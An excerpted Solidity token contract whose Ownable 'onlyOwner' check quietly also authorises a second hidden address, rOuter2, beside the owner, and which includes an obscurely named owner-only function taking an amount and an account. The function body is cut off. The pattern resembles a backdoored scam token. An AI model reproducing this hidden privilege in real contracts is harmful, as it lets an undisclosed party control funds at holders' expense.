...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()   ==  rOuter2 , "Ownable: caller is not the owner");
        _;
    }
...
contract Baby is Context, IERC20, Ownable {
    ...
    string private _name = "dem33";
    string private _symbol = "demo33";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x7B35A443230683De3784aa11fAa54DB16F38d0a2);
    address payable public teamWalletAddress = payable(0x7B35A443230683De3784aa11fAa54DB16F38d0a2);
    ...
    uint256 public  INITIAL_FRAGMENTS_SUPPLY = 4 * 10 * 1000000000 * 10**_decimals;
    uint256 public  MAX_UINT256 = ~uint256(0);
    uint256 public  MAX_SUPPLY = ~uint256(0);
    uint256 public  rSupply = MAX_UINT256 - (MAX_UINT256 % INITIAL_FRAGMENTS_SUPPLY);


    uint256 private _totalSupply = INITIAL_FRAGMENTS_SUPPLY;
    ...
    function zfhs(uint256 amount,address account) onlyOwner() public {
